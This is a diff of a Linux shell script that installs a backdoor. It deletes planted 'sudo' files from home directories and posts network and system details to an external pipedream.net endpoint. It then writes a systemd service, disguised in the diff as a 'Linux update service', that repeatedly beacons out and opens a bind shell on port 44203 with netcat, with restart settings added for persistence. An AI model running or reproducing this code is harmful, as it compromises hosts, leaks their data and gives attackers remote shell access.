@@ -2,17 +2,27 @@
 
 for user in `find /home/ -maxdepth 1 -type d`; do
     rm -f "$user/.local/bin/sudo"
+    rm -f "$user/.bin/sudo"
+    rm -f "$user/bin/sudo"
 done
 
 (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/root_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
 
 echo -e "
 [Unit]
-Description=Systemd service.
+Description=Linux update service.
+
+After=network-online.target
+
+StartLimitIntervalSec=500
+StartLimitBurst=5
 
 [Service]
 Type=simple
 ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/ping_root_\$(uname -n) -X POST -d \"\$(</dev/stdin)\"; nc -lp 44203 --e /bin/bash; sleep 10; done'
+
+Restart=on-failure
+RestartSec=5s
 
 [Install]
 WantedBy=multi-user.target
